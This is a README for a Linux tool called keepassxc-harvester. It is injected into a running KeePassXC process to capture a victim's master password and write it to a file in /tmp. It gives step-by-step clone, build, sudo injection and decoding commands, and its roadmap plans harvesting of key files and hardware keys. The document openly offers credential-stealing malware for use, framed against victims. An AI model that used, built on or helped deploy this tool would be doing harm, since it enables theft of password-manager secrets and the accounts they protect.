# keepassxc-harvester
A Linux program that intercepts a victim's KeePassXC master password from memory. Working as of KeePassXC version 2.7.6.

## Usage
1. Clone the repo
```
git clone https://github.com/mark-burnette/keepassxc-harvester.git
```
2. Run the makefile
```
cd keepassxc-harvester
make
```
3. Run keepassxc
4. Load the library with your choice of injector. I have included one given [here](https://aixxe.net/2016/09/shared-library-injection).
```
sudo ./inject.sh keepassxc keepassxc_harvester.so
```
5. Enter a master password and attempt to unlock a database. The password will be written to a file in _/tmp_ in the format _/tmp/password\_XXXXXX_.
6. Optional: Convert the file from UTF-16LE to UTF8
```
iconv -f UTF-16LE -t UTF8 [file]
```

## Roadmap
- [x] Add support for harvesting master passwords
- [ ] Add support for harvesting key files
- [ ] Add support for harvesting hardware keys

## License
Distributed under GPLv2. See LICENSE for more information.